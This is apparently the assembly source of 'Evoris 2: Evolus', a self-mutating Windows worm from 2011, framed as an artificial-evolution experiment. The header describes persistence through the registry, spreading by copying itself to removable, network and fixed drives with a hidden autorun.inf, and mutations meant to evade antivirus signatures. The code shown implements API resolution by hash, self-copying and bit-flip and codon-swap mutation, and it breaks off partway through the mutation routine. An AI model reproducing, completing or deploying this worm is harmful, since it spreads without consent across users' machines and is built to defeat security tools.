;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;;  Evoris 2: Evolus
;;  by SPTH
;;  July 2011
;;
;;
;;  This is an advanced version of my Evoris worm from November 2010.
;;
;;  The worm takes use of an evolvable meta-language concept, which has
;;  been presented in an article "Taking the redpill: Artificial Evolution
;;  in native x86 systems" (10.2010), and further in "Imitation of Life:
;;  Advanced system for native Artificial Evolution" (07.2011); and analysed in
;;  VirusBulletin 03.2011 ("Flibi night"), and VirusBulletin 05.2011 ("Flibi: Evolution").
;;
;;
;;
;;
;;  Metalanguage:
;;    It has been shown in different approaches of artificial simulations,
;;    that evolution can be achieved if the artificial chemistry fulfills
;;    several conditions: A small instruction set, separation of arguments
;;    and operations, and non-direct addressing.
;;    In an x86 environment, this can be done by creating a special meta-
;;    language. The meta-language in this approach is very near connected
;;    to the natural biosynthese:
;;
;;       Artificial   --   Natural
;;       Bit          --   Nucleobase
;;       Byte         --   Codon
;;       Instruction  --   Amino acid
;;       Function     --   Protein
;;       Translator   --   tRNA
;;
;;    To achieve evolution, it is also required that there are enough
;;    neutral mutations. In an short analyse "Mutational Robustness in x86
;;    systems", it has been shown that the most robust concept is meta-langauge
;;    with a redundant alphabet.
;;
;;
;;
;;
;;  Alphabet:
;;    The alphabet contains the base-commands of the language:
;;
;;    nopREAL
;;    nopsA, nopsB, nopsD, nopdA, nopdB, nopdD
;;    save, addsaved
;;    saveWrtOff, saveJmpOff
;;    writeByte, writeDWord,
;;    getDO, getdata, getEIP
;;    push, pop, pushall, popall
;;    add0001, sub0001
;;    shl, shr, xor, and
;;    mul, div
;;    JnzUp, JnzDown, call
;;    CallAPILoadLibrary
;;
;;    These are the 32 commands of the metalanguage. Each command is represented
;;    by a 8bit value. As there are 256 (2^8) possibilities to write a 8bit
;;    code there is a big source for redundancy - just as in nature, where 20
;;    amino acids are coded by 64 (4^3) possibilities to write the nucleobases.
;;
;;    It would be possible to decrease the size of the instruction set further
;;    (in "Flibi: Evolution" it's shown that a set of 18 instructions is enough
;;    to perform the same functionality), but this leads to evolutionary negative
;;    effects.
;;
;;
;;
;;
;;  Start- and Stop-codons:
;;    In natural biosynthesis, an functional code starts by an initialization
;;    codon (START), and ends with a termination codon (STOP). Parts between STOP
;;    and START are called Introns and will be cutted out before translation.
;;    This process is called Splicing. A similar concept has been created too for
;;    these artificial organisms - and it can lead to unexpected good results such
;;    as macro- and behaviour mutation.
;;
;;
;;
;;
;;  Evolvable API calls:
;;    kernel32.dll and advapi32.dll are loaded thru LoadLibraryA. The export
;;    table is parsed, and a 12bit hash of the exported API is created. If that
;;    hash is the same as a hardcoded 12bit hash in the file, the API address is
;;    saved.
;;    The idea is: there are ~1000 exported APIs in kernel32.dll, there are
;;    ~4000 possibilities how to write a 12bit code. That means, by a single
;;    bit-flip of the API hash, there is a possibility of ~25% that a new
;;    valid API will be called.
;;
;;
;;
;;
;;  To achieve evolution it is necessary to have replication, mutation
;;  and selection.
;;
;;
;;  Replication:
;;    It makes a registry-entry to start at every Windows Startup.
;;    All ~25sec it searchs for all removeable, network, fixed drives and
;;    copies itself to them. For removable and network drives, it creates a
;;    hidden autorun.inf:
;;        - - -
;;        [Autorun]
;;        ShellExecute=filename.exe
;;        UseAutoplay=1
;;        - - -
;;
;;
;;
;;
;;  Mutation:
;;    The program can use several types of mutations:
;;
;;    Bitflip (point mutation): it changes a single bit of the code
;;
;;    XCHG (Inversion): it exchanges the position of 8 bytes (8 commands)
;;                      ABCD EFGH -> EFGH ABCD (25.0%)
;;
;;    Insertion/Deletion: it can move some part of the code, and fill the
;;                        rest with NOPs (20%)
;;
;;    Horizontal gene transfer: It is able to copy code from foreign files
;;                              and insert it into its offspring (same idea
;;                              as bacteria use to rapidly distribute functions
;;                              such as antibiotica resistancy.
;;
;;    Polymorphism: Neutral Codon Exchange:
;;                          The worm searchs its alphabet for equal amino acids,
;;                          if it finds some equivalent once, it goes thru its
;;                          codon stream and exchange those equivalences.
;;
;;
;;
;;
;;  Selection:
;;    The natural selection for malware will come from antivirus scanners.
;;    As soon as the signature of a certain representation of the worm is
;;    in the database of AV programs, it can not spread alot anymore. Just those
;;    mutations can spread, which are so different to the original in the
;;    database, that it is not recognized anymore. This is a very natural
;;    selection process.
;;    There may be other selective advantages such as new functionalities - for
;;    a more detailed see the article mentioned above.
;;
;;
;;
;;
;;  Including Introns:
;;    To include introns, a C++ file has been created, as FASM Macro language
;;    is much too slow for this task.
;;
;;
;;
;;  Compiler Polymorphism:
;;    There are two different FASM macro-language polymorphisms with the effect
;;    that two different Evolus organism look different.
;;
;;    -> The first polymorphism takes use of the redundance of the alphabet.
;;       Each codon is a macro call, which returns one of the possible pointer
;;       to the responding amino acid. (Let's say, _save has 3 representations:
;;       1,2,3 - then the _save-macro writes randomly one of these into the file)
;;       The evolutionary advantage is that the codons are equally distibuted,
;;       and the risk of a mutation is spread over all codons.
;;
;;    -> It is possible, instead of using an optimized alphabet (CreateRandomAlphabet-macro)
;;       to use a randomly mixed alphabet (CreateBalancedAlphabet). This can be
;;       selected in the CreateAlphabet-Macro.
;;
;;
;;
;;
;;  Tested at WinXP SP3, but it should also work with WinVista+.
;;
;;
;;
;;
;;  Thanks to: hh86 && qkumba
;;  Greets goes to herm1t, roy g biv, alcopaul, Mostafa Saleh, all ex-rRlf members &
;;                 & all serious researchers
;;
;;
;;
;;
;;  Evoris comes from a unification of Evolution and Virus, Evolus is the
;;  evolved Evoris. :)
;;
;;
;;
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;








include 'E:\Programme\FASM\INCLUDE\win32ax.inc'

RndNum = %t AND 0xFFFF'FFFF
macro GetNewRandomNumber
{
    RndNum = ((RndNum*214013+2531011) AND 0xFFFF'FFFF)
}

macro CreateNOPString
{
    GetNewRandomNumber
    if ((RndNum SHR 16) MOD 2)=0
	while ((RndNum SHR 16) MOD 15)<>0
	    GetNewRandomNumber
	    if ((RndNum SHR 16) MOD 15)=0
		nop
	    end if
	    if ((RndNum SHR 16) MOD 15)=1
		mov eax, eax
	    end if
	    if ((RndNum SHR 16) MOD 15)=2
		shr ecx, 0
	    end if
	    if ((RndNum SHR 16) MOD 15)=3
		shl edi, 0
	    end if
	    if ((RndNum SHR 16) MOD 15)=4
		add eax, 0
	    end if
	    if ((RndNum SHR 16) MOD 15)=5
		and eax, -1
	    end if
	    if ((RndNum SHR 16) MOD 15)=6
		xor eax, 0
	    end if
	    if ((RndNum SHR 16) MOD 15)=7
		sub ebp, 0
	    end if
	    if ((RndNum SHR 16) MOD 15)=8
		or esi, 0
	    end if
	    if ((RndNum SHR 16) MOD 15)=9
		xchg eax, eax
	    end if
	    if ((RndNum SHR 16) MOD 15)=10
		push ebx
		pop ebx
	    end if
	    if ((RndNum SHR 16) MOD 15)=11
		pushad
		mov edi, RndNum
		popad
	    end if
	    if ((RndNum SHR 16) MOD 15)=12
		db 0xEB,0x00 ; jmp next; next:
	    end if
	    if ((RndNum SHR 16) MOD 15)=13
		and ebx, ebx
	    end if
	    if ((RndNum SHR 16) MOD 15)=14
		push ebp
		add ebp, RndNum
		pop ebp
	    end if
	    GetNewRandomNumber
	end while
    end if
}

.data
	include 'data_n_equs.inc'
;        a db "Am I allowed to live?",0x0
;        b db "In evolution we trust",0x0


.code
start:
;  invoke Sleep, 1000
  CreateNOPString
  CreateNOPString
  CreateNOPString
  CreateNOPString
  CreateNOPString
  CreateNOPString
  CreateNOPString
  CreateNOPString
;  invoke MessageBox, 0x0, a, b, 0x0

	AlignedSize=0x1'0000
	while ((EndAmino-StAmino)*8)>AlignedSize
	    AlignedSize=AlignedSize+0x1'0000
	end while

	CreateNOPString
	invoke	VirtualAlloc, \
		0x0, \
		AlignedSize, \
		0x1000, \
		PAGE_EXECUTE_READWRITE
	CreateNOPString
	mov	[Place4Life], eax

	CreateNOPString
	mov	eax, 0x0				; EAX will work as Splicing seperator
	CreateNOPString
	mov	edx, 0x0				; EDX will be used as the counter of this loop
	CreateNOPString
	WriteMoreToMemory:
		mov	ebx, 0x0			; EBX=0;
		CreateNOPString
		mov	bl, byte[edx+StAmino]		; BL=NUMBER OF AMINO ACID
		CreateNOPString

		cmp	bl, StartCodon			; If we found a start codon, adjust Splicing seperator

		jne	SplicingNoStart
		CreateNOPString
			mov	eax, 0x0
			CreateNOPString
		SplicingNoStart:

		cmp	bl, StopCodon			; If we found a stop codon, adjust Splicing seperator
		jne	SplicingNoStop
		CreateNOPString
			mov	eax, 0x91		; 0x91 = 1001 0001
			CreateNOPString
		SplicingNoStop:

		or	bl, al				; SPLICING!
		CreateNOPString

		shl	ebx, 3				; EBX*=8;
		CreateNOPString

		mov	esi, StartAlphabeth		; ESI ... Alphabeth offset
		CreateNOPString

		add	esi, ebx			; ESI+=EBX; ESI ...  offset of the current amino acid
		CreateNOPString

		mov	ebx, edx			; EBX ... current number of amino acid
		CreateNOPString

		shl	ebx, 3				; EBX ... lenght of amino acids before this one
		CreateNOPString

		mov	edi, [Place4Life]		; EDI ... Memory address
		CreateNOPString

		add	edi, ebx			; Offset of current memory for 8 byte code
		CreateNOPString

		mov	ecx, 8				; ECX ... 8
		CreateNOPString

		rep	movsb				; Write ECX bytes from ESI to EDI
		CreateNOPString
							; Write 8 bytes from Alphabeth to Memory
		inc	edx				; Increase EDX
		CreateNOPString

	cmp	edx, (EndAmino-StAmino)
	jne	WriteMoreToMemory
	CreateNOPString

	call	[Place4Life]				; Lets start!!!




; ##################################################################
; Alphabeth
StartAlphabeth:
include 'alphabeth.inc'
CreateAlphabet

EndAlphabeth:

; ##################################################################

include 'instruction_set_macros.inc'

; ##################################################################
; Amino Acids
StAmino:

; ############################################################################
; ############################################################################
; ############################################################################
; #####
; #####  Here the genom gets the Addresses of the Windows APIs.
; #####  It loads via LoadLibrary the kernel32.dll and advapi32.dll,
; #####  searchs in the Export Table for the adequade API (creating
; #####  an internal 12 bit checksum, and compares it with some hardcoded
; #####  12bit values). This procedere should be evolvable.
; #####
; #####  Optimum would have been to call the Windows APIs by its
; #####  Ordinal Numbers, but they change at every release of Windows.
; #####
; #####  At Linux, evolvable API calls are already presented, as you
; #####  call int 0x80 with a specific number in eax which represents
; #####  the API number.
; #####
; #####
;
; The Hash-Algo is equivalent to:
; ===============================
;
;;FindAPIGiveMeTheHash:
;; In: ebx=pointer to API name
;; Out: eax=Hash   (in ax)
;; changed: eax
;;        mov     ebx, apistr
;
;        push    ebx
;        push    ecx
;        push    edx
;        xor     eax, eax
;        xor     ecx, ecx
;        dec     ebx
;        FindAPIGiveMeTheHashMore:
;                inc     ebx
;                mov     ecx, dword[ebx]
;                xor     eax, ecx
;                mov     edx, ecx        ; ecx=nooo - n ... new byte
;                shr     edx, 8          ; edx=000n ... new byte
;                cmp     dl, 0           ; dl=n
;        jne     FindAPIGiveMeTheHashMore
;
;        and     eax, 0x0FFF
;        pop     edx
;        pop     ecx
;        pop     ebx
;ret



StAminoAcids1:
;        repeat 100
;            _nopREAL
;        end repeat


	db _START
	db _STOP

	db _START

	GetAddress mCloseHandle
	_saveWrtOff
	_zer0 0
	addnumber 0x0342
	_writeDWord

	GetAddress mCopyFileA
	_saveWrtOff
	_zer0 0
	addnumber 0x0C5C
	_writeDWord

	GetAddress mCreateFileA
	_saveWrtOff
	_zer0 0
	addnumber 0x0615
	_writeDWord

	GetAddress mCreateFileMappingA
	_saveWrtOff
	_zer0 0
	addnumber 0x04E1
	_writeDWord

	GetAddress mCreateProcessA
	_saveWrtOff
	_zer0 0
	addnumber 0x0674
	_writeDWord

	GetAddress mGetDriveTypeA
	_saveWrtOff
	_zer0 0
	addnumber 0x0AFD
	_writeDWord

	GetAddress mGetCommandLineA
	_saveWrtOff
	_zer0 0
	addnumber 0x06A8
	_writeDWord

	GetAddress mGetFileSize
	_saveWrtOff
	_zer0 0
	addnumber 0x083B
	_writeDWord

	GetAddress mWriteFile
	_saveWrtOff
	_zer0 0
	addnumber 0x078B
	_writeDWord

	GetAddress mGetTickCount
	_saveWrtOff
	_zer0 0
	addnumber 0x01B4
	_writeDWord

	GetAddress mMapViewOfFile
	_saveWrtOff
	_zer0 0
	addnumber 0x05EE
	_writeDWord

	GetAddress mSleep
	_saveWrtOff
	_zer0 0
	addnumber 0x07F9
	_writeDWord

	GetAddress mFindFirstFileA
	_saveWrtOff
	_zer0 0
	addnumber 0x094A
	_writeDWord

	GetAddress mFindNextFileA
	_saveWrtOff
	_zer0 0
	addnumber 0x0FE1
	_writeDWord

	GetAddress mUnmapViewOfFile
	_saveWrtOff
	_zer0 0
	addnumber 0x01D1
	_writeDWord

	GetAddress mSetErrorMode
	_saveWrtOff
	_zer0 0
	addnumber 0x0CBB
	_writeDWord

	GetAddress mRegCreateKeyA
	_saveWrtOff
	_zer0 0
	addnumber 0x0EDC
	_writeDWord

	GetAddress mRegSetValueExA
	_saveWrtOff
	_zer0 0
	addnumber 0x0845
	_writeDWord


	GetAddress stDLLkernel32	 ; write "kernel32.dll" and "advapi32.dll"
	_saveWrtOff			 ; to the data-section. This will be used
	_nopdA				 ; by LoadLibraryA as argument later
	_zer0 0
	addnumber 'kern'
	_writeDWord

	_nopsA
	addnumber 4
	_saveWrtOff
	_nopdA
	_zer0 0
	addnumber 'el32'
	_writeDWord

	_nopsA
	addnumber 4
	_saveWrtOff
	_nopdA
	_zer0 0
	addnumber '.dll'
	_writeDWord

	GetAddress stDLLadvapi32
	_saveWrtOff
	_nopdA
	_zer0 0
	addnumber 'adva'
	_writeDWord

	_nopsA
	addnumber 4
	_saveWrtOff
	_nopdA
	_zer0 0
	addnumber 'pi32'
	_writeDWord

	_nopsA
	addnumber 4
	_saveWrtOff
	_nopdA
	_zer0 0
	addnumber '.dll'
	_writeDWord


	GetAddress stDLLkernel32
	_push
	_CallAPILoadLibrary	 ; invoke LoadLibrary, "kernel32.dll"

	GetAddress hDLLlibrary32
	_saveWrtOff


	_nopsA
	_writeDWord		 ; mov dword[hDLLkernel32], eax

	_save			 ; Save kernel32.dll position
	 addnumber 0x3C
	_getdata		 ; mov RegB, dword[hDLLkernel32+0x3C]
				 ; = Pointer to PE Header of kernel32.dll
	_addsaved		 ; relative -> absolut

	addnumber 0x78
	_getdata		 ; Export Tables
	_addsaved		 ; relative -> absolut
	addnumber 0x1C		    ; Addresse Table

	_nopdA			 ; temporarily save Offset of Addresse Table in RegA

	GetAddress hAddressTable
	_saveWrtOff		 ; WriteOffset=hAddressTable

	_nopsA			 ; restore RegA=Addresse Tables
	_getdata		 ; Pointer To Addresse Table
	_addsaved		 ; relative -> absolut
	_writeDWord		 ; mov dword[hAddressTable], (Pointer to Addresse Table)

	GetAddress hNamePointerTable
	_saveWrtOff		 ; WriteOffset=hNamePointerTable

	_nopsA			 ; BC1=Addresse Table
	addnumber 4		 ; BC1=Name Pointer Table
	_nopdA

	_getdata		 ; Pointer To Name Table
	_addsaved		 ; relative -> absolut
	_writeDWord		 ; mov dword[hNamePointerTable], (Pointer to Name Pointer Table)

	GetAddress hOrdinalTable
	_saveWrtOff		 ; WriteOffset=hOrdinalTable

	_nopsA
	addnumber 4		 ; BC=Pointer to Ordinal Table

	_getdata		 ; Ordinal Table
	_addsaved		 ; relative -> absolut
	_writeDWord		 ; mov dword[hOrdinalTable], (Pointer to Ordinal Table)



	GetAddress APINumber
	_saveWrtOff
	_zer0 1
	addnumber APINumberKernel
	_writeDWord		 ; Save number of kernel32.dll APIs


	GetAddress hAddressePointer
	_saveWrtOff
	GetAddress APIAddresses
	_writeDWord	 ; Saves the AddressePointer


	GetAddress hMagicNumberPointer
	_saveWrtOff
	GetAddress APIMagicNumbersKernel
	_writeDWord	 ; Saves the MagicNumber Pointer

	_zer0 0
	addnumber 43
	_push

; FindAllAPIs
	_getEIP
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_saveJmpOff	 ; mov BA2, eip  - for further API searching in different DLLs

	_pushall

		_zer0 0
		_nopdB		; RegB = Counter for first instance loop = 0

		GetAddress hAddressePointer
		_getdata
		_nopdA		 ; RegA = Pointer to Buffer for API Addresse

		GetAddress hMagicNumberPointer
		_getdata
		_nopdD		 ; RegD = Pointer to Magic Numbers for APIs



	    ; FindAllAPIsNext
		_getEIP
		_sub0001
		_sub0001
		_sub0001
		_sub0001
		_sub0001
		_saveJmpOff	 ; mov BA2, eip


		_pushall
			; RegA=free  | used for pointer within the Name Pointer Table
			; RegB=free  | used as temporary buffer
			; RegD=MagicNumber for API
			; Stack:  | counter (number of APIs checked in kernel32.dll)

			GetAddress hNamePointerTable
			_getdata
			_nopdA		     ; Pointer to Name Pointer Table (points to first API)

			_zer0 0
			_sub0001
			_push		     ; counter

		   ; SearchNextAPI:
			_getEIP
			_sub0001
			_sub0001
			_sub0001
			_sub0001
			_sub0001
			_saveJmpOff	     ; mov BA2, eip

			_pop
			addnumber 0x1		; counter++
			_push

			GetAddress hDLLlibrary32
			_getdata
			_save		     ; kernel32.dll position

			_nopsA		     ; Pointer to NamePointerTable
			_getdata	     ; Points to API name
			_addsaved	     ; relative -> absolut
			_sub0001	     ; -- (for algorithm)
			_nopdB		    ; save Pointer to API name


			_nopsA
			addnumber 4		; Points to next API name
			_nopdA		     ; Has just effects in next loop

			_pushall
				_zer0 0
				_nopdA

				_getEIP
				_sub0001
				_sub0001
				_sub0001
				_sub0001
				_sub0001
				_saveJmpOff	     ; mov BA2, eip

				_nopsA
				_save		     ; RegA=MagicNumber

				_nopsB
				addnumber 1
				_nopdB		    ; BC1=NamePointer++

				_getdata	     ; BC1=dword[NamePointer+n]

				_addsaved	     ; BC1=BC1 + BC2 = dword[NamePointer+n] xor MagicNumber
				_nopdA

				_zer0 0
				addnumber 8
				_save

				_nopsB
				_getdata	     ; BC1=nxxx
				_shr		     ; BC1=???n
				_push

				_zer0 0
				addnumber 0xFF
				_save		     ; BC2=0xFF
				_pop		     ; BC1=???n
				_and		     ; BC1=000n

				_JnzUp

				GetAddress APITmpBuffer
				_saveWrtOff
				_nopsA
				_writeDWord	     ; mov dword[APITmpBuffer], RegA

			_popall

			GetAddress APITmpBuffer
			_getdata
			_nopdB		    ; save MagicNumber of this API


			_zer0 0
			addnumber 0x0FFF
			_save		     ; save 0x0FFF in BC2

			_nopsB
			_and		     ; BC1=dword[MagicNumberOfThisAPI] && 0x0FFF
			_nopdB

			_nopsD		     ; Get Pointer to API MagicWord
			_getdata
			_and		     ; BC1=dword[MagicNumberSearchAPI] && 0x0FFF
			_save		     ; save

			_nopsB		     ; Get MagicNumber of current API again
			_xor		     ; (dword[MagicNumberSearchAPI] && 0x0FFF) XOR dword[MagicNumberOfThisAPI] && 0x0FFF
					     ; If zero, assume that we found API
		    _JnzUp


			_zer0 0
			addnumber 1
			_save		     ; BC2=1

			_pop		     ; Get Counter from Stack
			_shl		     ; BC1=counter*2 (because Ordinal Table has just 2byte Entries)
						; (=no DLLs with more than 65535 functions?!)
			_save

			GetAddress hOrdinalTable
			_getdata
			_addsaved	     ; Points to ordinal number of the API

			_push
			_zer0 0
			addnumber 0xFFFF
			_save
			_pop		     ; BC2=0xFFFF

			_getdata	     ; BC1=Ordinal Number of API
						; Ordinal Number is a word, so we have to set the high word to zero
			_and		     ; BC1=dword[Ordinal] && 0xFFFF

			_push
			_zer0 0
			addnumber 2
			_save
			_pop
			_shl		     ; BC1=Ordinal*4, as Addresse to Function is a dword

			_save

			GetAddress hAddressTable
			_getdata

			_addsaved	     ; BC1 points to Addresse of API Function
			_getdata	     ; BC1=Addresse of API Function
			_save

			GetAddress hDLLlibrary32
			_getdata
			_addsaved	     ; relative -> absolut
						; BC1 contains the Addresse of the API in (kernel32) memory


			_nopdB		    ; save the Addresse in RegB
			GetAddress hAddressePointer
			_getdata	     ; Pointer to the buffer where we save the API addresse
			_saveWrtOff	     ; We will write to this Addresse

			_nopsB		     ; restore API Addresse

			_writeDWord	     ; Save the API Function Addresse in the Function Buffer!!!


		_popall

		GetAddress hAddressePointer
		_saveWrtOff	 ; The buffer where we save the pointer

		_nopsA
		addnumber 0x4	    ; Next Buffer for API Adresse

		_writeDWord	 ; save pointer
		_nopdA		 ; save different (prevents a more messy code)

		_nopsD		 ; Next Magic Number for API
		addnumber 0x4
		_nopdD

		_nopsB
		addnumber 0x1	 ; Increase API-Counter
		_nopdB
		_save

		GetAddress APINumber
		_getdata


		_subsaved 0	; cmp Counter, APINumber
		_JnzUp		 ; Jnz FindAllAPIsNext

	    ; end FindAllAPIsNext

	_popall
	; FoundAPI

; end FindAllAPIs in kernel32.dll

	GetAddress stDLLadvapi32
	_push
	_CallAPILoadLibrary	 ; invoke LoadLibrary, "kernel32.dll"


	GetAddress hDLLlibrary32
	_saveWrtOff


	_nopsA
	_writeDWord		 ; mov dword[hDLLkernel32], eax

	_save			 ; Save kernel32.dll position

	addnumber 0x3C
	_getdata		 ; mov RegB, dword[hDLLkernel32+0x3C]

				    ; = Pointer to PE Header of kernel32.dll
	_addsaved		 ; relative -> absolut

	addnumber 0x78
	_getdata		 ; Export Tables
	_addsaved		 ; relative -> absolut
	addnumber 0x1C		    ; Addresse Table

	_nopdA			 ; temporarily save Offset of Addresse Table in RegA

	GetAddress hAddressTable
	_saveWrtOff		 ; WriteOffset=hAddressTable

	_nopsA			 ; restore RegA=Addresse Tables
	_getdata		 ; Pointer To Addresse Table
	_addsaved		 ; relative -> absolut
	_writeDWord		 ; mov dword[hAddressTable], (Pointer to Addresse Table)

	GetAddress hNamePointerTable
	_saveWrtOff		 ; WriteOffset=hNamePointerTable

	_nopsA			 ; BC1=Addresse Table
	addnumber 4		 ; BC1=Name Pointer Table
	_nopdA

	_getdata		 ; Pointer To Name Table
	_addsaved		 ; relative -> absolut
	_writeDWord		 ; mov dword[hNamePointerTable], (Pointer to Name Pointer Table)

	GetAddress hOrdinalTable
	_saveWrtOff		 ; WriteOffset=hOrdinalTable

	_nopsA
	addnumber 4		    ; BC=Pointer to Ordinal Table

	_getdata		 ; Ordinal Table
	_addsaved		 ; relative -> absolut
	_writeDWord		 ; mov dword[hOrdinalTable], (Pointer to Ordinal Table)


	GetAddress APINumber
	_saveWrtOff
	_zer0 0
	addnumber APINumberAdvapi
	_writeDWord		 ; Save number of kernel32.dll APIs

	GetAddress hAddressePointer
	_saveWrtOff
	GetAddress APIAddressesReg
	_writeDWord	 ; Saves the AddressePointer


	GetAddress hMagicNumberPointer
	_saveWrtOff
	GetAddress APIMagicNumbersReg
	_writeDWord	 ; Saves the MagicNumber Pointer


	_zer0 0
	addnumber 42
	_save
	_pop
	_sub0001
	_push
	addnumber 1
	_xor
	_JnzUp

	_pop			; Remove trash from stack


	_zer0 0
	addnumber 0x8007
	_push
	CallAPI hSetErrorMode

	CallAPI hGetTickCount


; ############################################################################
; ############################################################################
; ############################################################################
; #####
; #####   First child ...
; #####


	GetAddress RandomNumber
	_saveWrtOff
	_nopsA
	_writeDWord		 ; mov dword[RandomNumber], RegA

	_zer0 0
	_nopdB			; mov RegB, 0


;   RndNameLoop:
	_getEIP
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_saveJmpOff		 ; mov esi, eip

	GetAddress RandomNumber

	_getdata
	_nopdA			 ; mov eax, [RandomNumber]


	_zer0 0
	_nopdD			 ; mov edx, 0

	addnumber 26

	_div			 ; div ebx

	_nopsD
	addnumber 97
	_nopdD			 ; add edx, 97

	_nopsB	    ; ebx=ebp=count
	_save	    ; ebp=ebx=ecx=count

	GetAddress RandomFileName
		       ; ebx=rfn, ebp=ecx=count
	_addsaved   ; ebx=rfn+count, ebp=ecx=count
	_saveWrtOff ; edi=rfn+count, ebx=rfn+count, ebp=ecx=count


	_nopsD
	_writeByte		 ; mov byte[ecx+RandomFileName], dl

	CalcNewRandNumberAndSaveIt

	_nopsB
	addnumber 1
	_nopdB
	_save			 ; inc counter

	_zer0 1
	addnumber 8
	_subsaved 0		; cmp counter, 8


	_JnzUp			 ; jnz esi
; loop RndNameLoop

	GetAddress rndext
	_saveWrtOff
	_zer0 0
	addnumber ".exe"
	_writeDWord		 ; create extention

	CallAPI hGetCommandLineA
	_zer0 0
	addnumber 0xFF
	_save

	_nopsA
	_getdata
	_and

	_nopdB		 ; RegB=1st byte of filename
	_zer0 0
	addnumber 34	 ; "
	_nopdD		 ; RegD=34


	_nopsB
	_save
	_nopsD
	_subsaved 0

	_JnzDown
	    _nopsA
	    _add0001
	    _nopdA
	    _nopREAL

	_nopsA
	_push		    ; Save RegA at stack

; FindEndOfString:
	_getEIP
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_saveJmpOff	    ; mov esi, eip

	_nopsA
	addnumber 1
	_nopdA

	_zer0 0
	addnumber 0xFF
	_save
	_nopsA
	_getdata
	_and
	_nopdD		     ; RegD=(dword[Name+count]&& 0xFF)

	_zer0 0
	addnumber 34	     ; "
	_save
	_nopsB		     ; 1st Byte of filename
	_subsaved 1

	_JnzDown
	    _nopsD
	    _xor
	    _JnzUp
	    _nopREAL
; EndFindEndOfString:

	_nopsA
	_saveWrtOff

	_zer0 1
	addnumber 34	     ; "
	_nopsB		     ; 1st Byte of filename
	_subsaved 0
	_JnzDown
	    _save
	    _xor
	    _writeByte
	    _nopREAL

	_pop
	_nopdA


	GetAddress Driveletter3-1
	_saveWrtOff
	_zer0 0
	addnumber 0x5C3A4300		 ; 0x0, "C:\"
	_writeDWord

	GetAddress virusname
	_saveWrtOff
	_zer0 0
	addnumber "evol"
	_writeDWord

	GetAddress virusname+4
	_saveWrtOff
	_zer0 0
	addnumber "usss"
	_writeDWord		     ; Construct virusfilename

	GetAddress virext
	_saveWrtOff
	_zer0 0
	addnumber ".exe"
	_writeDWord		     ; create extention

	_nopsA
	_push			    ; Save pointer to filename buffer
	_zer0 0
	_push
	GetAddress Driveletter3
	_push
	_nopsA
	_push
	CallAPI hCopyFileA	       ; Copy myself to C:\VIRUSNAME!!! (will not be mutated)

	_pop
	_nopdA
	_zer0 0
	_push
	GetAddress RandomFileName
	_push
	_nopsA
	_push
	CallAPI hCopyFileA	       ; Make a copy of myself with random name
				       ; this copy will be mutated and spreaded

	_zer0 0
	_push
	_push
	addnumber 3
	_push
	_zer0 0
	_push
	addnumber 1
	_push
	_sub0001
	addnumber 0xC0000000
	_push
	GetAddress RandomFileName
	_push
	CallAPI hCreateFileA


	GetAddress FileHandle
	_saveWrtOff
	_nopsA
	_writeDWord		 ; mov dword[FileHandle], RegA

	_save

	GetAddress FileSize

	_push
	_zer0 1
	_addsaved
	_push
	CallAPI hGetFileSize

	GetAddress FileSize
	_saveWrtOff
	_nopsA
	_writeDWord		 ; mov dword[FileSize], RegA

	_zer0 1
	_push
	_addsaved
	_push
	_zer0 0
	_push
	addnumber 4
	_push
	_zer0 0
	_push
	GetAddress FileHandle
	_getdata
	_push
	CallAPI hCreateFileMappingA

	GetAddress MapHandle

	_saveWrtOff
	_nopsA
	_writeDWord		  ; mov dword[MapHandle], RegA

	_save
	GetAddress FileSize

	_getdata
	_push	; [FileSize]
	_zer0 1
	_push	; 0
	_push	; 0
	addnumber 2
	_push
	_zer0 1
	_addsaved
	_push	; MapHandle

	CallAPI hMapViewOfFile

	GetAddress MapPointer

	_saveWrtOff
	_nopsA
	_writeDWord		 ; mov dword[MapPointer], RegA

	_nopsA
	_nopdB			; mov RegB, RegA+AminoStartInMap




; ############################################################################
; ############################################################################
; #####
; #####  Here the mutation happens: Bitmutation, exchange of codons, ...
; #####

;ANextByteInChain:
	_getEIP
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_saveJmpOff		 ; mov BA2, eip

	_nopsB
	_push			 ; push counter


; ############################################################################
; ##### Start Bit-Flip Mutation (Point-Mutation)

	_zer0 0
	addnumber 12
	_save

	GetAddress RandomNumber

	_getdata
	_shr
	_push

	_zer0 0
	addnumber 7
	_save

	_pop
	_and			 ; BC1=[RandomNumber shr 12] && 0111b
	_save

	_zer0 1
	addnumber 1
	_shl			 ; shl BC1, BC2
	_save

	_pop
	_push
	_saveWrtOff		 ; BA1=[MapPointer]+counter

	_getdata		 ; mov BC1, dword[BC1]
	_xor			 ; xor BC1, BC2
	_nopdB			 ; save changed byte


	_zer0 0
	addnumber 7
	_save

	GetAddress RandomNumber

	_getdata
	_nopdA

	_zer0 1
	_nopdD

	addnumber VarThreshold1

	_div
	_nopsD
	_subsaved 0
	_JnzDown
		_nopsB			 ; restore
		_writeByte		 ; save mutation!
		_nopREAL
		_nopREAL


; ##### Finished Bit-Flip Mutation (Point-Mutation)
; ############################################################################


	CalcNewRandNumberAndSaveIt


; ############################################################################
; ##### Start codons exchange


	GetAddress xchgBuffer
	_saveWrtOff

	_pop
	_push			     ; get counter

	_getdata
	_writeDWord		     ; xchgBuffer=dword[counter]

	_pop
	_push			     ; get counter
	_saveWrtOff		     ; save destination for potential writing

	addnumber 4
	_getdata
	_nopdB			     ; RegB=dword[counter+4]


	_zer0 0
	addnumber 7
	_save
	GetAddress RandomNumber

	_getdata
	_nopdA

	_zer0 1
	_nopdD

	addnumber xchgThreshold1

	_div
	_nopsD
	_subsaved 0

	_JnzDown		 ; if not zero, dont exchange codons
	    _nopsB		     ; restore
	    _writeDWord 	     ; save mutation!
	    _nopREAL
	    _nopREAL

	GetAddress xchgBuffer
	_getdata

	_nopdB

	_pop
	_push			 ; get counter
	addnumber 4
	_saveWrtOff


	_zer0 0
	addnumber 7
	_save
	GetAddress RandomNumber

	_getdata
	_nopdA

	_zer0 1
	_nopdD

	addnumber xchgThreshold1

	_div
	_nopsD
	_subsaved 0

